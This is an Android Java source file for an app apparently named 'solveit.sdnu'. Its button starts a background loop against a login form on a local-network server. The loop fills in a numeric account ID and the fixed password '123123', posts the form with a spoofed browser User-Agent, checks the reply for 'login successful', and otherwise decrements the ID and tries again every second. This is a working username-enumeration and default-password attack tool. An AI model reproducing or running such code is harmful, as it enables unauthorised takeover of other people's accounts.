package com.solveit.sdnu;

import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.w3c.dom.Element;

import java.lang.ref.WeakReference;
import java.math.BigInteger;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ScrollingActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_scrolling);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Runing", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
                new Thread(runnable).start();
            }
        });
    }

    MyHandler handler = new MyHandler();

    Runnable runnable = new Runnable(){
        @Override
        public void run() {
            final String url = "http://192.168.255.195:8080/Control?id=2000";
            final String post = "http://192.168.255.195:8080/Control?id=1000";
            String USER_AGENT = "User-Agent";
            String USER_AGENT_VALUE = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
            BigInteger user = new BigInteger("19862171157"), need = new BigInteger("1");
            Map<String, String> cookies;
            try {
                while (true) {
                    Toast toast;
                    Connection con = Jsoup.connect(post);
                    con.header(USER_AGENT, USER_AGENT_VALUE);
                    //con.data("strAccount", user.toString()).data("strPassword", "123123").data("id", "2000");
                    //con.referrer(post);
                    Connection.Response res = con.execute();

                    //cookies = res.cookies();
                    /*cookies.put("myusername", user.toString());
                    cookies.put("username", user.toString());
                    cookies.put("smartdot", "123123");*/
                    Document dd = Jsoup.parse(res.body());

                    List<org.jsoup.nodes.Element> eleList = dd.select("form");

                    Map<String, String> datas = new HashMap<>();

                    for(int i = 0; i < eleList.size(); i++){
                        for(org.jsoup.nodes.Element e : eleList.get(i).getAllElements()){
                            // 设置用户名
                            if (e.attr("name").equals("strAccount")) {
                                e.attr("value", user.toString());
                            }
                            // 设置用户密码
                            if (e.attr("name").equals("strPassword")) {
                                e.attr("value", "123123");
                            }
                            if(e.attr("name").equals("id")){
                                e.attr("value", "2000");
                            }
                            // 排除空值表单属性
                            if (e.attr("value").length() > 2) {
                                datas.put(e.attr("name"), e.attr("value"));
                            }
                        }
                    }

                    Connection cnn1 = Jsoup.connect(post);
                    cnn1.header(USER_AGENT, USER_AGENT_VALUE);
                    //cnn1.referrer(post);
                    Connection.Response ree = cnn1.ignoreContentType(true).followRedirects(true)
                            .method(Connection.Method.POST).data(datas)
                            .cookies(res.cookies())
                            .execute();

                    cookies = ree.cookies();
                    Connection cnn = Jsoup.connect(url);
                    cnn.header(USER_AGENT, USER_AGENT_VALUE);
                    cnn.referrer(post);
                    Connection.Response re = cnn//.ignoreContentType(true).followRedirects(true)
                            .method(Connection.Method.GET)//.data(datas)
                            .cookies(cookies)
                            .execute();
                    Document doc = Jsoup.parse(re.body());

                    Log.d("find", doc.toString());
                    Elements els = doc.select("td[align=center]");
                    String aim = els.toString();

                    Log.e("RUN: ", aim);
                    if(aim.indexOf("登录成功") != -1)
                        break;
                    else user = user.subtract(need);

                    //getMainLooper().prepare();
                    //toast=Toast.makeText(getApplicationContext(),aim,Toast.LENGTH_SHORT);
                    //toast.show();
                    //getMainLooper().loop();

                    Thread.sleep(1000);
                    handler.sendEmptyMessage(user.mod(new BigInteger("10000")).intValue());
                    //getMainLooper().prepare();
                    //toast=Toast.makeText(getApplicationContext(),"retry",Toast.LENGTH_SHORT);
                    //toast.show();
                    //getMainLooper().loop();
                }
                handler.sendEmptyMessage(0);
            }
             /* 要执行的操作
             */
            // 执行完毕后给handler发送一个空消息
            catch (Exception e) {
                handler.sendEmptyMessage(1);
            }
        }
    };

    class MyHandler extends Handler {
        //WeakReference<ScrollingActivity> mWeakReference;
        //MyHandler(ScrollingActivity activity)
        //{
        //    mWeakReference = new WeakReference<ScrollingActivity>(activity);
        //}
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            //mWeakReference.get().todo();
            if(msg.what == 0){
                Log.e("handleMessage: ", "win");
                Toast tt = Toast.makeText(getApplicationContext(), "Solve", Toast.LENGTH_SHORT);
                tt.show();
            }
            else if(msg.what == 1){
                Toast tt = Toast.makeText(getApplicationContext(), "fault", Toast.LENGTH_SHORT);
                tt.show();
            }
            else  {
                //Log.e("handleMessage: ", "fault");
                Toast tt = Toast.makeText(getApplicationContext(), msg.toString(), Toast.LENGTH_SHORT);
                tt.show();
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_scrolling, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        /*
        Handle action bar item clicks here. The action bar will
        automatically handle clicks on the Home/Up button, so long
        as you specify a parent activity in AndroidManifest.xml.
        */
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }
        return super.onOptionsItemSelected(item);
    }
}
